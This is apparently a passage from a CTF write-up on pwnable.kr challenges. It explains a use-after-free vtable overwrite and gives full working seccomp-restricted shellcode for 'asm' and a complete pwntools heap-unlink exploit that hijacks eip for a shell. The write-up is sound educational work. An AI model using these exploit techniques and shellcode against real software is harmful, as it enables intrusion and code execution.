The user controls when the UAF is created and triggered by choosing the "free" and "use" options, respectively.  First, freeing both classes will actually free four total heap chunks: two 0x30 length chunks for each inherited `Human` class, and then the 0x20 `man` and `woman` chunks.  The last "after" choice allocates user input to the heap using C++'s `new` operation, and the user chooses how much to allocate.  By strategically allocating less than 0x18 bytes, the returned chunk will absorb one of the man / woman classes.  Tcache is a FIFO stack, so the first chunk overridden is the former `woman` chunk.  This is not particuarly useful, because `man->introduce()` is the first function called in the "use" choice.  If the `man` chunk is not overriden then this call will lead to a segmentation fault.  So both chunks must be overridden by less than 0x18 bytes of an external file.  The overwrite strategy is to clobber the first qword which maintains the `man` vtable address; when `man->introduce()` is called, the binary finds `man`'s vtable and then the offset for `introduce()` within that vtable.  As shown in the first data dump, that offset is 0x18 bytes into the vtable.  By overwriting the vtable address to 0x8 bytes before its actual value, the 0x18 will instead call `give_shell()`, which returns a user shell and can read the flag from the server. 

### asm

*Exploit Primitive*: Shellcoding within `seccomp` restrictions

*Exploit Technique*: N/A

This is a basic shellcoding challenge within a `seccomp` environment. The basic idea of the challenge is to read a ridiculously named file from the remote server using only the `read, write, open, and exit` functions.  The challenge provides a direct call to the shellcode and also starts with a stub which clears all potentially needed registers.  Because the shellcoe is `mmap`d at a known address, it is possible to use that known address as a hard-coded value in the shellcode.  However, relative values could be leveraged to make the exploit behave more dynamically.  

The shellcode is relatively simple. First, the filename must be loaded into memory because it does not already exist.  Before storing this, a few instructions are required to store the current address and jump rip past the filename. Since the filename is a known length, this is relatively simple.  The process of reading the flag requires calls to `open()`, `read()`, `write()` and `exit()`, in that order.  The following code generates the required shellcode to read the flag and write it to `stdout`.   

```python
filename = b'./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00'

shellcode =  b"\x4C\x8D\x3D\x00\x00\x00\x00"    # lea r15, [rip], 
shellcode += b"\x4D\x89\xFE"                    # mov r14, r15
shellcode += b"\x48\x89\xE5"                    # mov rbp, rsp
shellcode += b"\x49\x81\xC7"                    # add r15, len(shellcode + next instructions)
shellcode += (len(filename) + 0x18).to_bytes(4, "little") 
shellcode += b"\x49\x83\xC6"                    # add r14, len(next instructions) 
shellcode += 0x14.to_bytes(1, "little")
shellcode += b"\x41\xFF\xE7"                    # jmp r15
shellcode += filename
shellcode += b'\x90' * 0x10
# open
shellcode += b"\x4C\x89\xF7"                    # mov rdi, r14 ; 
shellcode += b"\xB0\x02"                        # mov al, 2
shellcode += b"\x0F\x05"                        # syscall
shellcode += b"\x49\x89\xC5"                    # mov r13, rax
# read
shellcode += b"\x48\x89\xC7"                    # mov r15, rax
shellcode += b"\x49\x81\xC6\x00\x03\x00\x00"    # add r14, 0x300
shellcode += b"\x4C\x89\xF6"                    # mov rsi, r14
shellcode += b"\x48\xC7\xC2\x00\x01\x00\x00"    # mov rdx, 0x100
shellcode += b"\x48\x31\xC0"                    # xor rax, rax
shellcode += b"\x0F\x05"                        # syscall
# write
shellcode += b"\x48\xC7\xC7\x01\x00\x00\x00"    # mov rdi, 1
shellcode += b"\xB0\x01"                        # mov al, 1
shellcode += b"\x0F\x05"                        # syscall
# exit(0)
shellcode += b"\x48\x31\xFF"                    # xor rdi, rdi
shellcode += b"\xB8\x3C\x00\x00\x00"            # mov eax, 60
shellcode += b"\x0F\x05"                        # syscall
```

### unlink

*Exploit Primitive*: Heap buffer overflow

*Exploit Technique*: Heap linked list corruption 

This is another heap challenge with a heap buffer overflow courtesy of `gets()`.  The `OBJ` structures are `malloc`d on the heap and user input can overflow the first object to clobber the second and / or third object.  This is followed by the `unlink()` function which modfies memory within the objects pointed to by `B->fd` and `B-bk`.  Both these vas can be clobbered by the heap buffer overflow.  The trick for this challenge is: how should they be modified?  The program contains a `shell()` luefunction which resides at a stack address because the binary is compiled without PIE.  So the goal is to hijack eip with the address to shell through the overflow and unlinking. 

Overwriting the return instruction pointer directly is impossible, because storing `shell()`'s address would also overwrite data within the shell function during unlinking.

```c
// shell() needs to be either FD or BK, meaning it will be overwritten by the return address
FD->bk=BK; 
BK->fd=FD;
```

But eip can be hijacked by first hijacking ebp to pop a different base pointer using the `leave` instruction in unlink.  This is normally a valid method, however decompilation at the end of `main()` (below) shows that the return instruction is actually stored at `[ebp-0x4] - 0x4`.

```gdb
0x080485f2 <+195>:	call   0x8048504 <unlink>
0x080485f7 <+200>:	add    esp,0x10
0x080485fa <+203>:	mov    eax,0x0
0x080485ff <+208>:	mov    ecx,DWORD PTR [ebp-0x4]
0x08048602 <+211>:	leave  
0x08048603 <+212>:	lea    esp,[ecx-0x4]
0x08048606 <+215>:	ret    
```

This means the following structure is implemented.  The final value moved into esp (and then popped into eip with `ret`) is modified by changing the value stored in ecx. 

```
             ebp - 0x4  --  ebp
                 |
                ecx   < target : hijack here >
                 |
 return  --  return + 0x4       
```

All the required addresses involved are calculable: `ebp - 0x4` is found to be `stack address + 0x10`, `shell()` can be stored on the heap at a known address in relation to `heap address`, and a pointer to `shell address + 0x4` can be trivially calculated.  The following exploit demonstrates a successful eip hijack and shell on the server. 

```python
from pwn import *

def exploit(): 
    p = process("./unlink")
    # get addresses
    p.recvuntil(b"address leak: ")
    stack_address = int(p.recvline(), 16)
    ebp_minus_4 = stack_address + 0x10
    shell_address = 0x80484eb
    p.recvuntil(b"address leak: ")
    heap_address = int(p.recvline(), 16)
    p.recvuntil(b'shell!\n')

    # craft and send payload
    payload =  p32(shell_address)
    payload += b'A' * 0x8                   # fill buffer and next dword
    payload += p32(0x19)                    # size of chunk (could clobber)
    payload += p32(ebp_minus_4 - 0x4)       # ptr to 4 bytes before target address
    payload += p32(heap_address + 0xc)      # ptr to 4 bytes before shell address on heap
    payload += b'\n'
    p.send(payload)
    p.interactive()

if __name__ == "__main__":
    exploit()
```